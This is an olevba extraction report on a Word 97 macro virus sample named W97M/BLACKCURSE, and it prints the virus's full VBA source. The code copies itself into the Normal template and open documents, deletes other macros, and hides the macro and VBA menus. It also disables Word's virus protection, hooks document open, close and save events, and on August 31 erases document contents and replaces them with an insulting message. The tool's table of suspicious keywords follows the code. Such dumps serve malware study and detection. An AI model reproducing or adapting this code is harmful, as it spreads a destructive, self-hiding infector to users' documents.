olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bleck-e37951f6ad9f01a6a53aea6dc9904f68c42228d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bleck-e37951f6ad9f01a6a53aea6dc9904f68c42228d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BLACKCURSE.bas 
in file: Virus.MSWord.Bleck-e37951f6ad9f01a6a53aea6dc9904f68c42228d9 - OLE stream: 'Macros/VBA/BLACKCURSE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub BLACKCURSE()
    ' W97M/BLACKCURSE
    ' BY BLACKROSE OF CAMARINES SUR
    ' BLACKROSE IS ALSO KNOWN AS ULTRAVIOLET,
    ' SKYFIRE AND BLACKVIRGOCODER
    On Error Resume Next
    Dim NormlTemp, ActivDoc As Boolean, Cntr As Double, WhereWeAre As Object
    Call AboutTheAuthor
    Set BlackNormalObj = NormalTemplate.VBProject.VBComponents
    Set BlackActiveObj = ActiveDocument.VBProject.VBComponents
    For Cntr = 1 To BlackNormalObj.Count
        MName = BlackNormalObj.Item(Cntr).Name
            If MName = "BLACKCURSE" Then
                NormlTemp = True
                Set WhereWeAre = BlackNormalObj.Item("BLACKCURSE").Codemodule
            End If
            If (MName <> "BLACKCURSE") And (MName <> "ThisDocument") Then
                BlackNormalObj.Item(Cntr).Codemodule.Deletelines 1, BlackNormalObj.Item(Cntr).Codemodule.CountOfLines
            End If
    Next Cntr
    For Each Baby In Dďcuments
        ActivDoc = False
        Set BlackActiveObj = Baby.VBProject.VBComponents
        For Cntr = 1 To BlackActiveObj.Count
            MName = BlackActiveObj.Item(Cntr).Name
                If MName = "BLACKCURSE" Then
                    ActivDoc = True
                    Set WhereWeAre = BlackActiveObj.Item("BLACKCURSE").Codemodule
                End If
                If (MName <> "BLACKCURSE") And (MName <> "ThisDocument") Then
                    BlackActiveObj.Item(Cntr).Codemodule.Deletelines 1, BlackNormalObj.Item(Cntr).Codemodule.CountOfLines
                End If
        Next Cntr
        If NormlTemp And Not ActivDoc Then
            Spread BD:=BlackActiveObj.Add(1), BS:=WhereWeAre
               If InStr(1, ActiveDocument.Name, "Document", 1) = 0 Then
                   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=0
               End If
        End If
    Next Baby
    If Not NormlTemp Then
            Stealth
            Spread BD:=BlackNormalObj.Add(1), BS:=WhereWeAre
            NormalTemplate.Save
    End If
End Sub
Function Spread(BD As Object, BS As Object)
    On Error Resume Next
        Cntr = 1
        BD.Name = "BLACKCURSE"
        Do While BS.Lines(Cntr, 1) <> ""
            BD.Codemodule.Insertlines Cntr, BS.Lines(Cntr, 1)
            Cntr = Cntr + 1
        Loop
End Function
Sub Stealth()
    On Error Resume Next
        CustomizationContext = NormalTemplate
        CommandBars("Tools").Controls("Macro").Enabled = False
        CommandBars("Tools").Controls("Options").Enabled = False
        CommandBars("Visual Basic").Enabled = False
        CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
        CommandBars("Visual Basic").Protection = msoBarNoCustomize
        FindKey(BuildKeyCode(122, 1024)).Disable
        FindKey(BuildKeyCode(119, 1024)).Disable
        CommandBars("Visual Basic").Visible = False
End Sub
Sub AboutTheAuthor()
    On Error Resume Next
        With Dialogs(86)
          .Title = "BLACKCURSE"
          .Author = "BLACKROSE"
          .Execute
        End With
End Sub
Sub ActivateBLACKCURSE()
    On Error Resume Next
        Mensahe = """HIJADIPUTA KANG HAYUP KA!" & vbCrLf & _
                  "BURAY MO, SAKA BURAY NI INA MO! HAYUP KA!" & vbCrLf & _
                  "SAYANG KA, HAYUP KA!" & vbCrLf & _
                  "HAYUP KA TALAGA!"""
        If Dďcuments.Count = 0 Then
            Dďcuments.Add
        Else
            Selection.WholeStory
            Selection.Delete Unit:=1, Count:=1
        End If
        If ActiveWindow.View.SplitSpecial = wdPaneNone Then
            ActiveWindow.ActivePane.View.Type = wdPageView
        Else
            ActiveWindow.View.Type = wdPageView
        End If
        Application.Caption = "Birthday ko " & Date
        With Options
            .CheckGrammarAsYouType = False
            .CheckSpellingAsYouType = False
            .BlueScreen = False
        End With
        With Selection
            .Font.Name = "Copperplate Gothic Light"
            .Font.Size = 20
            .Font.ColorIndex = wdAuto
            .ParagraphFormat.Alignment = 1
            .TypeText Text:="A CURSE FROM BLACKROSE TO SOMEONE HE HATES"
            .Font.Size = 14
            .TypeParagraph
            .TypeParagraph
            .TypeText Text:=Mensahe
            .TypeParagraph
            .TypeParagraph
            .Font.Size = 20
            .TypeText Text:="WORD97/BLACKCURSE" & Chr(10)
            .Font.Bold = False
            .Font.Size = 12
            .TypeText Text:="VIRGOBLACKROSE Virus Development" & vbCrLf & "Libmanan Camarines Sur"
        End With
        If InStr(1, ActiveDocument.Name, "Document", 1) = 0 Then ActiveDocument.Save
End Sub
Sub AutoOpen()
    On Error Resume Next
        BLACKCURSE
        ShowVisualBasicEditor = False
        Application.EnableCancelKey = 0
        With Options
            .SaveNormalPrompt = False
            .SaveInterval = 10
            .VirusProtection = False
        End With
        If (Month(Now) = 8 And Day(Now) = 31) Then ActivateBLACKCURSE
End Sub
Sub AutoClose()
    On Error Resume Next
        BLACKCURSE
End Sub
Sub AutoExec()
    On Error Resume Next
        AutoOpen
End Sub
Sub filesave()
    On Error Resume Next
        BLACKCURSE
    ActiveDocument.Save
End Sub
Sub fileclose()
    On Error Resume Next
        BLACKCURSE
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileNew()
    On Error Resume Next
        Dialogs(wdDialogFileNew).Show
        AutoOpen
End Sub
Sub viewvbcode()
    On Error Resume Next
        Application.Quit
End Sub
p

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
